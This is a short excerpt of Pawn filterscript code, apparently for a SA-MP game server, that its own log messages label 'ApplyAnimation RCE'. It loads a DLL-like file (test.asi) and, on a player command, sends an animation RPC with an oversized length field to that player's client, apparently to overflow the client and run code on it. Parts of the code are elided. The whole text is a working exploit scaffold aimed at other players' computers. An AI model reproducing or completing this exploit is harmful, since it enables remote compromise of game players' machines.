...
public OnFilterScriptInit()
{
    ...
    if(!f) { print("[ApplyAnimation RCE] test.asi not found"); return 1; }
    dll_len = flength(f);
    if(dll_len > sizeof(dll) * 4) { printf("[ApplyAnimation RCE] too large: %d", dll_len); dll_len = 0; }
    else { fblockread(f, dll); printf("[ApplyAnimation RCE] loaded %d bytes", dll_len); }
    fclose(f);
    return 1;
}
...
public OnPlayerCommandText(playerid, cmdtext[])
{
    ...
    BS_WriteValue(bs, PR_UINT16, playerid, PR_UINT8, 3, PR_UINT8, 'P', PR_UINT8, 'E', PR_UINT8, 'D', PR_UINT8, sizeof(overflow));
    ...
    PR_SendRPC(bs, playerid, RPC_ANIM, PR_LOW_PRIORITY, PR_RELIABLE_ORDERED, 4);
    BS_Delete(bs);
